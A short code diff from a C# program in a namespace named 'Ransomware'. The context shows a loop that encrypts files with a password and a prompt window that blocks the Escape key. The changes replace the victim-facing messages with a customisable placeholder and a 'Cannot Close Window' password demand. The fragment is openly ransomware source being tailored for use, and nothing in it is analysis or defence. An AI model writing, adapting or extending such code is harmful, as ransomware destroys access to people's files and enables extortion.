@@ -20,7 +20,7 @@ namespace Ransomware
                 EncryptFile(file, password);
             }
 
-            Console.WriteLine("All files have been encrypted.");
+            Console.WriteLine("MESSAGE-YOU-WANT");
             Console.ReadLine();
 
             bool passwordMatched = false;
@@ -80,7 +80,7 @@ namespace Ransomware
                 }
                 else
                 {
-                    Console.WriteLine("Escape key is disabled for security reasons. Please enter the password.");
+                    Console.WriteLine("Cannot Close Window, :(     Enter the password: ");
                 }
             }
 
